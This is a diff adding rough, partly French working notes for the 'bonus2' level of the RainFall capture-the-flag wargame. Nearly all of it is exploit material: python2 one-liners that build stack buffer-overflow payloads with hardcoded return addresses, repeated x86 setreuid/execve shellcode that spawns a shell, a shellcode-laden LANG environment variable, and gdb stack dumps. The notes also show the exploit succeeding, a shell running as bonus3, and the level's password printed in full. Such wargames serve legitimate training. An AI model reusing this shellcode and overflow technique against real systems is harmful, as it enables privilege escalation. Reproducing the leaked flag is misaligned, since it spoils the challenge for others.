@@ -191,7 +191,86 @@ Hyvää päivää AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJaaaaaaaaaaaaaaaaaabbbb
 Program received signal SIGSEGV, Segmentation fault.
 0x62626262 in ?? ()
 
-var d'env
-0xbffff888
+(gdb) print (char *) getenv("SHELLCODE")
 
-$(python2 -c 'import sys; sys.stdout.write("A"*4 + "B"*4 + "C"*4 + "D"*4 + "E"*4 + "F"*4 +"G"*4 + "H"*4 + "I"*4 +"J"*4)') $(python2 -c 'import sys; sys.stdout.write("a"*18 + "\x88\xf8\xff\xbf" + "c"*34)')
+$(python2 -c 'import sys; sys.stdout.write("A"*4 + "B"*4 + "C"*4 + "D"*4 + "E"*4 + "F"*4 +"G"*4 + "H"*4 + "I"*4 +"J"*4)') $(python2 -c 'import sys; sys.stdout.write("a"*18 + "\x81\xf8\xff\xbf" + "c"*34)')
+
+
+
+
+----
+
+PEU DE NOP
+
+$(python2 -c 'import sys; sys.stdout.write("\x90"*6 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\xf2\xf5\xff\xbf" + "D"*10)')
+
+
+
+SHELLCODE 1
+
+$(python2 -c 'import sys; sys.stdout.write("\x90"*22 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52")') $(python2 -c 'import sys; sys.stdout.write("\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "B" * 2 + "\xf5\xf5\xff\xbf" + "D"*10)')
+
+
+
+SHELLCODE 2
+
+"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
+
+
+$(python2 -c 'import sys; sys.stdout.write("\x90"*20 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x31\xd2\x52")') $(python2 -c 'import sys; sys.stdout.write("\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "B" * 2 + "\xf5\xf5\xff\xbf" + "D"*10)')
+
+
+
+(gdb) x/50x $esp
+0xbffff5d0:	0xbffff5e0	0xbffff630	0x00000001	0x00000000
+0xbffff5e0:	0xc3767948	0x20a4c3a4	0x69a4c370	0xc3a4c376
+0xbffff5f0:	0x909020a4	0x90909090	0x90909090	0x90909090
+0xbffff600:	0x90909090	0x90909090	0x316a9090	0x80cd9958
+0xbffff610:	0xc189c389	0xcd58466a	0x520bb080	0x732f6e68
+0xbffff620:	0x2f2f6868	0xe3896962	0x80cdd189	0x41414141
+0xbffff630:	0x44444444	0x44444444	0x90004444	0x90909090
+0xbffff640:	0x90909090	0x90909090	0x9958316a	0xc38980cd
+0xbffff650:	0x466ac189	0xb080cd58	0x6e68520b	0x6868732f
+0xbffff660:	0x69622f2f	0xd189e389	0x414180cd	0x44444141
+0xbffff670:	0x44444444	0x44444444	0x00000000	0xb7e5ec73
+0xbffff680:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff690:	0x90909090	0x90909090
+
+
+
+
+
+bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write("\x90"*6 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\x08\xf6\xff\xbf" + "D"*10)')
+Hyvää päivää ������j1X�̀�É�jFX̀�
+                              Rhn/shh//bi���̀BBBBBBBBBBBBBBBBB���DDDDDDDDDD
+
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+
+
+export LANG= $(python2 -c 'import sys; sys.stdout.write("fi" + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')
+
+$(python2 -c 'import sys; sys.stdout.write("A"*40)') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\xb5\xfe\xff\xbf" + "D"*4 + "E"*5)')
+
+result
+
+
+Trouver adresse var d'env =
+x/20s *((char**)environ)
+
+
+``` bash
+export LANG=$(python2 -c 'import sys; sys.stdout.write("fi" + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')
+
+
+bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write("A"*40)') $(python2 -c 'import sys; sys.stdout.write("B"*18 + "\xb5\xfe\xff\xbf" + "D"*4 + "E"*5)')
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����DDDDEEEEE
+$ id
+uid=2013(bonus3) gid=2012(bonus2) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
+0xbffffeb5
